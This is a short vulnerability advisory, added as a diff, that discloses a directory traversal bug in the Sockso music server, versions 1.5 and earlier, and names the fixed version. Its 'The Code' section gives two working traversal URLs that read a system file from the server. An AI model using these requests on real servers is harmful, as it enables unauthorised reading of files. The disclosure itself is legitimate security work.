@@ -1,0 +1,73 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  Sockso
+              http://sockso.pu-gh.com
+Versions:     <= 1.5
+Platforms:    Windows, Mac, Linux
+Bug:          directory traversal
+Exploitation: remote
+Date:         14 Mar 2012
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bug
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+From author's homepage:
+"Sockso is a free, open-source, personal music host server for
+everyone! It's designed to be as simple as possible so that anyone with
+a mouse and some mp3's can get their friends listening to their music
+across the internet in seconds!"
+
+
+#######################################################################
+
+======
+2) Bug
+======
+
+
+The server is affected by a directory traversal vulnerability that
+allows downloading arbitrary files from the disk where the software is
+installed.
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+http://SERVER:4444/file/../../../../../windows/system.ini
+http://SERVER:4444/file/..\..\..\..\..\windows\system.ini
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+Version 1.5.1
+
+
+#######################################################################
